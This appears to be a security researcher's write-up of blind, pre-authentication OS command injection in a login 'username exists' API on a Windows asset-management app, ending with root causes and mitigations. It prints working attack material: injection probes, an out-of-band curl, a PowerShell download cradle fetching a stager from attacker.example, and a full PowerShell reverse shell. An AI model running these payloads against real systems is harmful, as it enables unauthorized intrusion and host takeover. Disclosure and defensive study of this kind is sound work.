---
title: "Unauthenticated OS Command Injection in a Login Pre-Check"
description: "How a Windows-hosted asset management app turned username existence checks into out-of-band command execution and PowerShell reverse shells — with the theory behind testing auth for OS sinks."
banner: OS COMMAND INJECTION // OOB // POWERSHELL RCE
tag: WEB APPLICATION SECURITY
subtitle: WINDOWS // AUTH WORKFLOW // BOOLEAN ORACLE
platform: Windows / Web Application
researcher: Naveen Jagadeesan
published: 2024-12-10
slug: os-command-injection-login-rce
severity: critical
target: Asset Management // Login Pre-Check // Windows Host
---

## Summary

An asset-management web application exposed an unauthenticated (or pre-auth) username check that concatenated user input into an OS command on a **Windows** host. Responses were nearly binary (`success: true/false`), so confirmation relied on **out-of-band (OOB)** and timing signals. A PowerShell stager completed full RCE under a high-privilege service account.

## Why look for RCE on a login form?

Auth endpoints are usually tested for:

- credential stuffing resistance
- user enumeration
- injection into SQL/LDAP

The less common — but high-yield — theory:

> Any “does this username exist?” feature that shells out to legacy enterprise tools (mail, directory, provisioning scripts, custom validators) can become an OS injection sink **before** password verification.

SSO options (Google/GitHub) on the same app increased confidence that the stack was modern on the outside and messy on the edges — exactly where shell helpers hide.

## Attack surface

- Asset management portal
- Auth: local password + Google SSO + GitHub SSO
- Host OS signals pointed to **Windows**
- Interesting call: username existence / pre-login validation JSON API

```http
POST /username_exists HTTP/1.1
Host: target.example
Content-Type: application/json

{
  "username": "whoami"
}
```

```http
HTTP/1.1 200 OK
Server: nginx/1.22.1
Content-Type: application/json

{"success": false}
```

No stdout reflection. That does **not** mean no execution — it means you need a side channel.

## Theory → validation strategy

For blind OS injection on Windows:

1. **Time oracle**: `ping -n 5 127.0.0.1` style delays (mind Windows ping syntax).
2. **DNS/HTTP OOB**: force the host to call attacker infrastructure.
3. **File write / download** to a monitored location if available.

Payload class used during confirmation:

```text
|ping -n 5 127.0.0.1||
|curl http://oast.example/u||
```

(Exact separator depends on whether the sink is `cmd.exe` or PowerShell; pipe/ampersand chaining is part of the probe set.)

Outbound fetch to an attacker-controlled URL confirmed execution even when the JSON body stayed `false`.

## Exploitation

Once OOB was stable, escalate from proof to shell. On Windows service hosts, PowerShell download cradles remain pragmatic when egress allows HTTP(S):

```text
|powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('https://attacker.example/stage.ps1')"||
```

Stager concept (listener-side reverse shell pattern):

```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',80);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
  $sendback = (iex ". { $data } 2>&1" | Out-String);
  $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
  $stream.Write($sendbyte, 0, $sendbyte.Length);
  $stream.Flush()
};
$client.Close()
```

Observed impact: reverse shell with **administrative-equivalent** process privileges — full host compromise from a pre-auth field.

## What made this interesting

1. **Pre-auth / auth-adjacent RCE** — no valid password required for the sink.
2. **Blindness done right** — boolean API did not stop exploitation; it forced better methodology.
3. **Privilege of the app pool** — injection without least privilege turned a web bug into a domain-relevant host issue.
4. **Login is “boring” surface** that still hides shell-outs in enterprise apps.

## Root cause

- User input concatenated into OS commands
- No allowlist for usernames (format, charset, length)
- No parameterization / safe APIs for the underlying check
- Over-privileged service account
- Insufficient egress controls (stager download succeeded)

## Mitigations

- Eliminate shell-outs from auth flows; use native libraries/APIs.
- If external tools are unavoidable, **fixed argv arrays** — never string build.
- Strict username grammar validation before any backend call.
- Run app pools as low-privilege users; block unexpected egress.
- Detect anomalous child processes from the web worker (`cmd.exe`, `powershell.exe`).

## Takeaway

When an auth API only returns booleans, **assume blind execution is still on the table**. Prove it with time and OOB first; reverse shells second. The best RCE findings often sit one function call behind “username already taken.”
